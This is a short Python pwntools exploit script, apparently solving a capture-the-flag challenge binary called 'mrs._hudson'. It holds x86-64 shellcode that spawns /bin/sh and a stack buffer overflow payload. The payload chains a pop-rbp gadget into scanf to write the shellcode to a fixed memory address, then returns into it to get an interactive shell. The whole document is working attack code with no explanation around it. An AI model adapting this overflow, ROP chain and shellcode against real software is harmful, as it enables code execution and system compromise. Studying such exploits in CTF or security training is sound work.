from pwn import *

context(os="linux", arch="x86_64")
pipe = process("./mrs._hudson")
shellcode = '''
    push 0x68
    mov rax, 0x732f2f2f6e69622f
    push rax
    mov rdi, rsp
    push 0x1010101 ^ 0x6873
    xor dword ptr [rsp], 0x1010101
    xor esi, esi /* 0 */
    push rsi /* null terminate */
    push 8
    pop rsi
    add rsi, rsp
    push rsi /* 'sh\x00' */
    mov rsi, rsp
    xor edx, edx /* 0 */
    push SYS_execve /* 0x3b */
    pop rax
    syscall
'''
code = asm(shellcode)
# print("length of shellcode: %d" % len(code))    # 48


pop_rbp_ret = 0x400575
target_mem = 0x601000
scanf = 0x40066F
payload1 = "A" * 120
payload1 += p64(pop_rbp_ret) + p64(target_mem + 0x70) + p64(scanf)
pipe.sendline(payload1)

payload2 = code.ljust(0x78, "A")
payload2 += p64(target_mem)
pipe.sendline(payload2)

pipe.interactive()
